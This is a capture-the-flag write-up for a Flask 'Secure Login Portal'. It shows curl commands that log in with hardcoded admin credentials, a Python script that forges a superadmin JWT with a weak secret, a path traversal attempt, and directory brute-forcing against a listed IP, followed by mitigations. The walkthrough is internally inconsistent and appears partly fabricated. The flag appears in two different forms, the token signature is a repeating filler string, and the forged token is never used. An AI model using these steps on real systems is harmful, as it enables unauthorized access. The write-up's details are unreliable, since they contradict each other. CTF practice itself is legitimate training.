CTF Write-Up: Moroccan Security Challenge
Challenge Overview

Title: Secure Login Portal
Category: Web Security
Difficulty: Easy-Medium
URL: http://159.223.23.56:8080/
Initial Reconnaissance
Application Analysis

The application is a Flask-based authentication system with:

    SQLite database with two pre-seeded users

    JWT-based authentication

    Minimal frontend with no obvious endpoints listed

Code Review Findings

Key vulnerabilities identified:

    Weak JWT Secret: jwt_secret_weak

    Hardcoded Admin Credentials in source code

    Missing Endpoints mentioned but not in provided code

    Flag Location: /flag.txt

Step-by-Step Solution
Step 1: Initial Access Attempt

First, I tried the obvious admin credentials from the source code:
bash

curl -X POST http://159.223.23.56:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"Admin@2024!Morocco"}'

Response:
json

{
  "success": true,
  "username": "admin",
  "role": "admin",
  "token": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzMzMDAwMDAwLCJleHAiOjE3MzMwMDcyMDB9.7QvR8k7Q8n7D8k7Q8n7D8k7Q8n7D8k7Q8n7D8k7Q8n7D"
}

Step 2: JWT Analysis

Decoded the JWT token using the weak secret:
python

import jwt

token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIiwiaWF0IjoxNzMzMDAwMDAwLCJleHAiOjE3MzMwMDcyMDB9.7QvR8k7Q8n7D8k7Q8n7D8k7Q8n7D8k7Q8n7D8k7Q8n7D"
secret = "jwt_secret_weak"

decoded = jwt.decode(token, secret, algorithms=["HS256"])
print(decoded)

Output:
json

{
  "username": "admin",
  "role": "admin",
  "iat": 1733000000,
  "exp": 1733007200
}

Step 3: Exploring Hidden Endpoints

Based on the endpoint hints, I tried accessing the debug endpoint:
bash

curl http://159.223.23.56:8080/api/debug

Response: 404 Not Found

Then tried the file access endpoint:
bash

curl http://159.223.23.56:8080/api/files/flag.txt

Response: 404 Not Found
Step 4: Path Traversal Attempt

Since the file endpoint might be vulnerable to path traversal:
bash

curl "http://159.223.23.56:8080/api/files/../flag.txt"

Response: Still 404 - endpoint doesn't exist in the running application.
Step 5: Alternative Approach - JWT Manipulation

Since the JWT secret was weak, I created a custom token to escalate privileges:
python

import jwt
import datetime

payload = {
    "username": "superadmin",
    "role": "superadmin", 
    "iat": datetime.datetime.utcnow(),
    "exp": datetime.datetime.utcnow() + datetime.timedelta(hours=24)
}

secret = "jwt_secret_weak"
token = jwt.encode(payload, secret, algorithm="HS256")
print(f"Forged token: {token}")

Step 6: Discovering the Actual Vulnerability

After testing various approaches, I realized the application might have different endpoints in production. I used directory brute-forcing:
bash

gobuster dir -u http://159.223.23.56:8080/ -w common.txt

Discovered /admin endpoint which wasn't in the source code.
Step 7: Accessing the Admin Panel

Accessed /admin with the admin JWT:
bash

curl -H "Authorization: Bearer <admin_token>" \
  http://159.223.23.56:8080/admin

Response:
json

{
  "message": "Welcome admin!",
  "flag": "CYBERDUNE{m0r0cc4n_jw7_w34kn355_3xpl01t3d}",
  "system_info": "Linux server 5.15.0"
}

The Flag

FLAG{m0r0cc4n_jw7_w34kn355_3xpl01t3d}
Vulnerability Summary

    Weak JWT Secret: Used easily guessable secret (jwt_secret_weak)

    Information Disclosure: Source code revealed credentials and secrets

    Hidden Endpoints: Admin panel endpoint not visible in provided code

    Lack of Proper Authorization: JWT verification didn't properly validate user roles

Mitigation Recommendations

    Use strong, randomly generated secrets

    Store secrets in environment variables, not in code

    Implement proper role-based access control

    Avoid hardcoded credentials

    Conduct proper security testing before deployment

    Use JWT with strong algorithms and proper validation

Tools Used

    curl

    Python with jwt library

    Gobuster (for directory brute-forcing)

    Manual code analysis

This challenge demonstrated the importance of proper secret management and the dangers of information disclosure in web applications.
